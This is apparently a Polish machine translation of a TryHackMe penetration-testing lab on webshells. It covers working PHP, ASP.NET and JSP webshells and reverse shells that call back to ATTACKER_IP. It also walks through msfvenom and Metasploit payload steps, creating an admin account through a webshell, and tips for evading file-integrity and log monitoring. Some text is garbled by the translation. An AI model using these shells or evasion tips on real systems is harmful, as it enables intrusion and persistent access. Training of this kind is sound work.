Aplikacje internetowe czasami pozwalają nam przesyłać pliki, a jeśli możemy przesłać skrypt po stronie serwera, możemy wykonać kod. Gdy zapory sieciowe lub ograniczenia sieciowe blokują tradycyjne powłoki odwrotne lub wiążące, powłoki internetowe służą jako obejście tego problemu. Działają one całkowicie na…HTTP/HTTPS, więc z perspektywy monitorowania sieci wyglądają jak normalny ruch internetowy.

## Zrozumienie Webshellów

Webshell to skrypt napisany w języku po stronie serwera (PHP, ASP, JSP, Python) akceptujący polecenia przezHTTPŻądania i uruchamia je na serwerze hostującym. Wysyłamy polecenia za pomocą parametrów URL, danych POST lub pól formularza, a skrypt wykonuje je z uprawnieniami serwera WWW. Dane wyjściowe są zwracane w formacie HTML.

Jest to szczególnie przydatne, gdy zapory sieciowe blokują nie-HTTPruch, gdy kierujemy się do wewnętrznych serwerów internetowych bez bezpośredniego dostępu do Internetu lub gdy chcemy zachować dostęp za pośrednictwem pliku, który łączy się zodpoczynekaplikacji internetowej.

## PodstawowyPHPWebshell

PHPjest nadal najpopularniejszym językiem po stronie serwera w sieci, więcPHPWebshelle działają na ogromnej liczbie celów. Minimalny mieści się w jednym wierszu:

```php
<?php echo "" . shell_exec($_GET["cmd"]) . ""; ?>
```

Ta powłoka internetowa akceptuje polecenia za pomocą parametru GET o nazwie „cmd” i wykonuje je za pomocąPHPFunkcja `shell_exec()`. `<pre>`Znaczniki zachowują formatowanie wyników poleceń, dzięki czemu wyniki są czytelne w przeglądarkach internetowych. Po zapisaniu jako plik PHP i przesłaniu na serwer WWW, umożliwiają natychmiastowe wykonanie poleceń.

Polecenia przekazywane są jako `GET`parametry dołączane do adresu URL:

```text
http://target-server.thm/uploads/shell.php?cmd=whoami
http://target-server.thm/uploads/shell.php?cmd=id
http://target-server.thm/uploads/shell.php?cmd=ls -la /var/www/html
```

Każde żądanie wykonuje określone polecenie na serwerze docelowym i zwraca dane wyjściowe w postaci strony internetowej. To podejście działa dla każdego polecenia, do którego wykonania proces serwera internetowego ma uprawnienia.

## Ulepszone funkcje powłoki Webshell

W praktyce zazwyczaj chcemy mieć kilka dodatkowych funkcji zwiększających użyteczność i umożliwiających ukrycie.

**Wykonywanie poleceń w oparciu o POST**

Używanie żądań POST zamiast parametrów GET pomaga uniknąć rejestrowania poleceń w dziennikach dostępu serwera WWW i historii adresów URL:

```php
<?php
if ($_POST['cmd']) {
    echo "" . shell_exec($_POST['cmd']) . "";
}
?>
```

**Uwierzytelnianie i maskowanie**

Dodanie sprawdzania hasła uniemożliwia innym atakującym (lub obrońcom) wykorzystanie naszej powłoki internetowej przeciwko nam:

```php
<?php
$password = "secure_password_here";
if ($_POST['auth'] === $password && $_POST['cmd']) {
    echo "" . shell_exec($_POST['cmd']) . "";
} else if ($_POST['auth'] && $_POST['auth'] !== $password) {
    echo "Authentication failed";
}
?>
```

## Webshelle specyficzne dla platformy

Różne platformy serwerów WWW wymagają powłok webowych w odpowiadającym im języku po stronie serwera. Oto główne z nich, z którymi się spotkamy.

**Powłoki internetowe ASP.NET**

Serwery Windows IIS z systemem ASP.NET mogą wykonywać powłoki internetowe w językach C# lub VB.NET:

```aspx
<​%@ Page Language="C#" %​>
<​%@ Import Namespace="System.Diagnostics" %​>
<​%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("" + p.StandardOutput.ReadToEnd() + "");
}
%​>
```

**JSP Webshells**

Aplikacje internetowe Java mogą obsługiwać powłoki internetowe oparte na JSP do wykonywania poleceń:

```jsp
<​%@ page import="java.io.*" %​>
<​%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("");
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
    out.println("");
}
%​>
```

## Uaktualnianie powłok internetowych do pełnych powłok

Powłoki webshellowe zapewniają niezawodny dostęp, ale brakuje im interaktywności właściwej powłoki. Prawdziwa sztuka polega na wykorzystaniu polecenia powłoki webshellowej do uruchomienia pełnego połączenia odwrotnego lub połączenia z powłoką.

**PowerShell Reverse Shell za pośrednictwem Webshell**

W systemach Windows możemy uruchomić odwrotną powłokę programu PowerShell za pośrednictwem powłoki webowej. Ładunek musi być zakodowany w postaci adresu URL, aby przetrwać transmisję HTTP:

```powershell
http://target-server.thm/shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27ATTACKER_IP%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

To jest to samoPowerShellodwrotna powłoka z zadania 2, zakodowana w adresie URLHTTPprzenoszenie.

**Linux Reverse Shell poprzez Webshell**

W systemach Linux możemy przesłać dowolny z ładunków powłoki odwrotnej z zadania 2 przez powłokę webową. Polecenie musi być zakodowane w formacie URL przed transmisją, ponieważ spacje, cudzysłowy i znaki specjalne, takie jak „ `>`i”, `&`spowodują, że serwer webowy otrzyma tylko fragment polecenia.

Zakodowany adres URL powłoki odwrotnej bash:

```shell-session
http://target-server.thm/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27
```

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765215788)

**Wskazówka:** Narzędzia takie jak **curl** obsługują kodowanie adresów URL automatycznie, gdy polecenie jest przekazywane w cudzysłowie:`curl "http://target-server.thm/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"`

## Kolekcje i narzędzia Webshell

Kali Linux jest dostarczany z kolekcją gotowych webshellów w formacie `/usr/share/webshells`. Mamy je również w AttackBoxie.

Webshelle

```bash
attacker@tryhackme:~$ ls /usr/share/webshells/
php

attacker@tryhackme:~$ ls /usr/share/webshells/php/
php-reverse-shell.php
```

PentestMonkeyPHPNajczęściej będziemy się odwoływać do reverse shell( `php-reverse-shell.php`). W przeciwieństwie do prostych webshellów opisanych powyżej, otwiera ona bezpośrednie połączenie zwrotne z naszym nasłuchiwaczem, zapewniając nam właściwą sesję powłoki zamiast pojedynczych żądań HTTP.

## Rozważania dotyczące wykrywania i unikania

Webshelle nie są niewidzialne. Oto, co może je wykryć.

- **Zapory aplikacji internetowych (WAF)** skanują przesyłane pliki i parametry żądań w poszukiwaniu typowych wzorców webshell. Zaciemnianie lub niestandardowe kodowanie może ominąć podstawowe reguły, ale nowoczesne zapory WAF są coraz skuteczniejsze w wykrywaniu zachowań.
- **Monitorowanie integralności plików** wysyła alerty dotyczące nowych lub zmodyfikowanych plików w katalogach internetowych. Używanie nazw plików, które wtapiają się w kontekst (takich jak `config.bak.php`) i umieszczanie plików w miejscach, w których spodziewane są transfery, zmniejsza ryzyko wygenerowania alertu.
- **Monitorowanie sieci** może sygnalizować nietypowe połączenia wychodzące z procesów serwera WWW. Ruch HTTPS w powłoce WWW jest trudniejszy do zbadania, ale sam wzorzec połączenia może wydawać się podejrzany.
- **Analiza logów** ujawnia ciągi poleceń w parametrach GET i nietypowe wzorce POST. Użycie POST zamiast GET i skrócenie poleceń pomaga, ale zdeterminowany analityk w końcu dostrzeże wzorzec dostępu.

## Najlepsze praktyki operacyjne

Kilka nawyków operacyjnych może decydować o tym, czy zachowasz dostęp, czy go utracisz.

- **Umieszczanie plików:** umieszczaj powłoki webshellowe w miejscach, w których spodziewane są przesyłane pliki, stosuj nudne nazwy plików i rozważ osadzanie kodu w istniejących, legalnych plikach.
- **Wzorce dostępu:** Zmieniaj czasy i nie obciążaj powłoki webowej błyskawicznymi żądaniami. Używaj realistycznych agentów użytkownika i nagłówków odsyłających.
- **Wybór polecenia:** Zacznij od podstawowego rozpoznania ( `whoami`, `id`, `ls`), zanim spróbujesz czegoś hałaśliwego, np. eskalacji uprawnień.
- **Czyszczenie:** Zawsze planuj, jak usuniemy webshell po zakończeniu prac. Pozostawienie backdoorów w środowisku produkcyjnym jest niedopuszczalne, nawet podczas autoryzowanych testów.

W tym zadaniu będziemy nadal używać celuMaszyna wirtualnauruchomiono w Zadaniu 2. Jeśli nie działa już poprawnie, uruchom je ponownie za pomocą przycisku **Uruchom maszynę** .SSHw korzystaniu z danych uwierzytelniających:

Referencje

Potrzebne tylko jeśli używasz własnego komputera.

Nazwa użytkownika

powłoka

Hasło

SpróbujH4ckM3!

Adres IP

Adres IP maszyny

Połączenie przez

SSH

sshshell@MACHINE_IP

Serwer internetowy umożliwiający przesyłanie plików za pomocą powłoki internetowej jest dostępny pod adresem `http://MACHINE_IP`.

Przed każdym ćwiczeniem, w którym przechwytujemy powłokę, uruchamiamy nasłuchiwacza netcata:`nc -lvnp 4444`

## Ćwiczenia

**1. Bezstopniowa powłoka odwrotna ELF**

Wygeneruj bezstopniową powłokę odwrotną ELF dla Linuksa za pomocą msfvenom i prześlij ją na komputer z Linuksem za pomocą serwera HTTP Pythona. Zaloguj się przez SSH, pobierz ładunek, nadaj mu uprawnienia wykonywalne i uruchom. Przechwyć połączenie za pomocą netcata.

Wygeneruj ELF

```bash
attacker@tryhackme:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f elf -o shell.elf

attacker@tryhackme:~$ python3 -m http.server 8000
```

Na maszynie docelowej:

Wykonaj ELF

```bash
shell@target:~$ wget http://CONNECTION_IP:8000/shell.elf -O /tmp/shell.elf
shell@target:~$ chmod +x /tmp/shell.elf && /tmp/shell.elf
```

**2. Etapowa odwrotna powłoka Linuxa za pośrednictwem multi/handler**

Wygeneruj przygotowaną odwrotną powłokę Linux za pomocą msfvenom i udostępnij jąHTTP:

Wykonaj ELF

```bash
attacker@tryhackme:~$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f elf -o staged_shell.elf

attacker@tryhackme:~$ python3 -m http.server 8000
```

Następnie skonfiguruj multi/handler w Metasploit:

wielokrotny/obsługowy

```bash
attacker@tryhackme:~$ sudo msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST CONNECTION_IP
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
```

Na komputerze docelowym pobierz i uruchom ładunek:

Wykonaj ładunek

```bash
shell@target:~$ wget http://CONNECTION_IP:8000/staged_shell.elf -O /tmp/staged_shell.elf
shell@target:~$ chmod +x /tmp/staged_shell.elf && /tmp/staged_shell.elf
```

Komunikat `Sending stage`w konsoli Metasploit potwierdza, że ​​dwufazowe uzgadnianie działa.

**3. PHP Webshell na Linuksie**

W AttackBox lub Kali utwórz plik webshell za pomocą edytora tekstu:

shell.php

```bash
attacker@tryhackme:~$ nano shell.php
```

Wklej poniższy kod do pliku i zapisz go:

```text
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Przejdź do formularza przesyłania `http://MACHINE_IP`i prześlij plik `shell.php`. Po przesłaniu przetestuj wykonanie polecenia w przeglądarce:

```text
http://MACHINE_IP/uploads/shell.php?cmd=whoami
http://MACHINE_IP/uploads/shell.php?cmd=id
```

**4. Odwróć powłokę za pomocą powłoki internetowej**

Najpierw upewnij się, że nasłuchiwacz netcat jest uruchomiony na AttackBoxie:

Nasłuchiwacz Netcat

```bash
attacker@tryhackme:~$ nc -lvnp 4444
```

Z poziomu powłoki PHP na komputerze z systemem Linux wywołaj odwrotną powłokę bash z powrotem do naszego programu nasłuchującego. Przekaż polecenie przez `curl`, który automatycznie obsługuje kodowanie adresów URL.

```text
curl -G "http://MACHINE_IP/uploads/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/CONNECTION_IP/4444 0>&1'"
```

Wyjaśnienie flag:

- `-G`:Wysyła dane jako ciąg zapytania żądania GET, a nie treść żądania POST
- `--data-urlencode "cmd=..."`:Koduje wartość w adresie URL i dołącza ją do adresu URL jako`?cmd=...`

Przed każdym ćwiczeniem, w którym przechwytujemy powłokę, uruchamiamy nasłuchiwacza netcata: `nc -lvnp 4444`

## Ćwiczenia

**1. Bezstopniowy plik EXE systemu Windows**

Wygeneruj bezetapowy ładunek Windows x64 EXE i prześlij go przez HTTP:

Wygeneruj plik EXE

```bash
attacker@tryhackme:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe
attacker@tryhackme:~$ python3 -m http.server 8000
```

Uruchom nasłuchiwacz netcat, aby przechwycić przychodzące powłoki:

Rozpocznij nasłuchiwanie

```bash
attacker@tryhackme:~$ nc -lvnp 4444
```

Na komputerze z systemem Windows otwórz program PowerShell i pobierz ładunek od atakującego:

Pobierz EXE

```powershell
PS C:\Users\Administrator> Invoke-WebRequest http://CONNECTION_IP:8000/shell.exe -OutFile C:\Users\Administrator\Desktop\shell.exe
```

Wykonaj to:

Wykonaj EXE

```powershell
PS C:\Users\Administrator> C:\Users\Administrator\Desktop\shell.exe
```

Program nasłuchujący netcat odbiera połączenie.

**2. Meterpreter systemu Windows z obsługą etapową za pośrednictwem multi/handler**

Wygeneruj przygotowany ładunek Meterpretera dla systemu Windows x64 i prześlij go przez HTTP:

Generuj plik EXE Staged

```bash
attacker@tryhackme:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o meterpreter.exe
attacker@tryhackme:~$ python3 -m http.server 8000
```

Skonfiguruj multi/handler w Metasploit:

Uruchom Multi/Handler

```bash
attacker@tryhackme:~$ sudo msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST CONNECTION_IP
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
```

Na komputerze z systemem Windows pobierz i uruchom ładunek:

Wykonywanie EXE

```powershell
PS C:\Users\Administrator> Invoke-WebRequest http://CONNECTION_IP:8000/meterpreter.exe -OutFile C:\Users\Administrator\Desktop\meterpreter.exe
PS C:\Users\Administrator> C:\Users\Administrator\Desktop\meterpreter.exe
```

Wejdź w interakcję z sesją i potwierdź dostęp:

Meterpreter

```bash
msf6 exploit(multi/handler) > sessions -i 1
meterpreter > sysinfo
meterpreter > getuid
```

**3. Konto administratora systemu Windows za pośrednictwem powłoki Webshell**

W AttackBoxie utwórz plik webshell:

Utwórz shell.php

```bash
attacker@tryhackme:~$ nano shell.php
```

Wklej poniższy kod do pliku i zapisz go:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Przejdź do formularza przesyłania `http://MACHINE_IP`i prześlij go . Po przesłaniu użyj go, aby utworzyć nowe konto administratora lokalnego. Spacje w poleceniach muszą być zakodowane jako :`shell.php``%20`

```text
http://MACHINE_IP/uploads/shell.php?cmd=net%20user%20pentester%20Passw0rd!%20/add
http://MACHINE_IP/uploads/shell.php?cmd=net%20localgroup%20administrators%20pentester%20/add
```

**4. RDP do systemu Windows przy użyciu nowego konta**

Połącz się z komputerem z systemem Windows przez RDP, używając konta, które właśnie utworzyliśmy:

RDP

```bash
attacker@tryhackme:~$ xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:pentester /p:'Passw0rd!'
```

`msfvenom`Obsługuje generowanie plików binarnych dla dowolnej platformy i formatu. Multi/handler przechwytuje ładunki etapowe i zarządza nimi.Meterpretersesje. Webshelle wykonują kod, gdy jedyną ścieżką jestHTTPprzesyłanie. A gdy już mamy tę pierwszą powłokę, wyszukiwanie poświadczeń i tworzenie konta przenosi nas z niestabilnego punktu zaczepienia do czegoś, z czym faktycznie możemy pracować.

W połączeniu z technikami przechwytywania i stabilizacji muszli z sali [Shells & Listeners Fundamentals](https://tryhackme.com/room/shellsfundamentals) , mamy teraz pełny obraz od konfiguracji słuchacza do stabilnego punktu oparcia. Naturalnym kolejnym krokiem jest eskalacja uprawnień, omówiona w…[LinuxPokoje eskalacji uprawnień](https://tryhackme.com/room/linprivesc) i [eskalacji uprawnień systemu Windows](https://tryhackme.com/room/winprivesc) w ścieżce szkoleniowej [TryHackMe Jr Penetration Tester](https://tryhackme.com/path/outline/jrpenetrationtester) .
